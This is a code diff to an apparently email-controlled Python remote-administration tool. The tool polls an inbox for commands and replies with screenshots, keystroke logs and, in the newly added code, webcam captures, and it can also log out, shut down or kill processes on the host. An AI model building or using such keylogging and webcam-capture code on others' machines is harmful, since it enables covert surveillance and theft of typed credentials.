@@ -37,7 +37,7 @@ class Mail:
             smtp.sendmail(USERNAME, self.sender, self.email_message.as_string())
             print("Mail sent to", self.sender)
 
-    def take_screenshot(self):
+    def screenshot(self):
         file_name: str = "Picture.png"
 
         if len(self.cmd_list) > 1:
@@ -55,7 +55,26 @@ class Mail:
                 picture_file.read(), name=os.path.basename(file_path)
             )
             self.email_message.attach(picture_attachment)
-
+    
+    def webcam(self):
+        file_name: str = "Webcam.png"
+        try:
+            file_name = self.cmd_list[1]
+        except:
+            pass
+        
+        file_path, message = capture_webcam(file_name)
+         
+        self.set_info("Webcam")
+        self.body = message
+        self.email_message.attach(MIMEText(self.body, "plain"))
+        
+        with open(file_path, 'rb') as picture_file:
+            picture_attachment = MIMEImage(
+                picture_file.read(), name=os.path.basename(file_path)
+            )
+            self.email_message.attach(picture_attachment)       
+    
     def keylogger(self):
         duration: int = 5
         try:
@@ -78,7 +97,7 @@ class Mail:
             )
             self.email_message.attach(text_attachment)
 
-    def log_out(self):
+    def logout(self):
         self.set_info("Logout")
         self.body = "Logged out of your PC."
         self.email_message.attach(MIMEText(self.body, "plain"))
@@ -86,7 +105,7 @@ class Mail:
         self.send_mail()
         os.system("shutdown -l")
 
-    def shut_down(self):
+    def shutdown(self):
         time: int = 10
         if len(self.cmd_list) > 1:
             time = int(self.cmd_list[1])
@@ -158,11 +177,11 @@ class Mail:
 
     def process_command(self):
         command = {
-            "screenshot": self.take_screenshot,
-            # "webcam": None,
+            "screenshot": self.screenshot,
+            "webcam": self.webcam,
             "keylog": self.keylogger,
-            "logout": self.log_out,
-            "shutdown": self.shut_down,
+            "logout": self.logout,
+            "shutdown": self.shutdown,
             "listApp": self.list_app,
             "listProcess": self.list_process,
             "terminateProcess": self.terminate_process,
@@ -189,6 +208,7 @@ class Mail:
         while True:
             self.fetch_mail()
             if len(self.cmd_list) != 0:
+                # print(self.cmd_list)
                 self.process_command()
                 self.send_mail()
                 self.refresh()
